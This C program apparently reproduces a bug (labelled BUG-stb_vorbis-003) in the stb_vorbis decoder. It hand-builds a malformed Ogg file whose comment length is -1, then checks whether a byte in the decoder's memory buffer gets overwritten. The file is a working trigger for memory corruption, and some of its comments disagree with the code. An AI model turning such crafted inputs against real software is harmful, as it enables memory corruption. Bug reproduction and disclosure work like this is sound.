#define STB_VORBIS_IMPLEMENTATION
#define STB_VORBIS_NO_STDIO
#include "stb_vorbis.c"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

static void w32(unsigned char *p, int v) { p[0]=v; p[1]=v>>8; p[2]=v>>16; p[3]=v>>24; }

int main() {
    unsigned char ogg[512];
    int pos = 0, seg;
    int error;

    memset(ogg, 0, sizeof(ogg));

    /* Page 1: Identification Header */
    memcpy(ogg+pos, "OggS", 4); pos += 4;
    ogg[pos++] = 0;
    ogg[pos++] = 0x02;
    w32(ogg+pos, 0); pos += 4;
    w32(ogg+pos, 0); pos += 4;
    w32(ogg+pos, 0x78); pos += 4;
    w32(ogg+pos, 0); pos += 4;
    w32(ogg+pos, 0); pos += 4;
    ogg[pos++] = 1;
    ogg[pos++] = 30;

    ogg[pos++] = 1;
    memcpy(ogg+pos, "vorbis", 6); pos += 6;
    w32(ogg+pos, 0); pos += 4;
    ogg[pos++] = 1;
    w32(ogg+pos, 44100); pos += 4;
    w32(ogg+pos, 0); pos += 4;
    w32(ogg+pos, 0); pos += 4;
    w32(ogg+pos, 0); pos += 4;
    ogg[pos++] = 0b01100110;
    ogg[pos++] = 1;

    /* Page 2: Comment Header with negative comment length */
    memcpy(ogg+pos, "OggS", 4); pos += 4;
    ogg[pos++] = 0;
    ogg[pos++] = 0x00;
    w32(ogg+pos, 0); pos += 4;
    w32(ogg+pos, 0); pos += 4;
    w32(ogg+pos, 0x78); pos += 4;
    w32(ogg+pos, 1); pos += 4;
    w32(ogg+pos, 0); pos += 4;
    seg = 30;
    ogg[pos++] = 1;
    ogg[pos++] = seg;
    ogg[pos++] = 3;
    memcpy(ogg+pos, "vorbis", 6); pos += 6;
    w32(ogg+pos, 0); pos += 4;         // vendor length = 0
    w32(ogg+pos, 1); pos += 4;         // comment_list_length = 1
    w32(ogg+pos, -1); pos += 4;        // comment[0] length = -1 (0xFFFFFFFF)
    ogg[pos++] = 1;                    // framing flag
    while ((pos - (pos-30-1-27)) < 30)  // fill remaining segment
        ogg[pos++] = 0;

    printf("BUG-stb_vorbis-003: negative comment length OOB write\n");

    /* Use alloc_buffer path (malloc path returns NULL for 0-size alloc).
       Layout after alloc:
         alloc_buf[0..7]   = vendor string (1 byte)
         alloc_buf[8..15]  = comment_list array (8 bytes = one char*)
         alloc_buf[16]     = comment[0] string (0 bytes)
       The OOB write f->comment_list[0][-1] = '\0' with len=-1
       writes to alloc_buf[16-1] = alloc_buf[15].
    */
    size_t buf_size = 64;
    unsigned char *alloc_buf = (unsigned char *)malloc(buf_size);
    if (!alloc_buf) { printf("FAIL: malloc failed\n"); return 1; }
    memset(alloc_buf, 0xAA, buf_size);

    stb_vorbis_alloc alloc;
    alloc.alloc_buffer = (char *)alloc_buf;
    alloc.alloc_buffer_length_in_bytes = (int)buf_size;

    stb_vorbis *v = stb_vorbis_open_memory(ogg, pos, &error, &alloc);
    if (v) {
        printf("FAIL: decoder opened successfully (unexpected)\n");
        stb_vorbis_close(v);
        free(alloc_buf);
        return 1;
    }

    /* The decoder fails at VORBIS_missing_capture_pattern (missing setup header),
       but the OOB write at comment_list[0][-1] = '\0' has already occurred.
       It writes to alloc_buf[7] == 0xAA originally, changes it to 0x00. */
    if (alloc_buf[15] == 0x00) {
        printf("BUG CONFIRMED: alloc_buf[15] corrupted from 0xAA to 0x00 by OOB write\n");
        printf("(This is the MSB of the comment_list[0] pointer value)\n");
    } else {
        printf("BUG NOT DETECTED: alloc_buf[15] = 0x%02x (expected 0x00)\n", alloc_buf[15]);
    }

    free(alloc_buf);
    return 0;
}
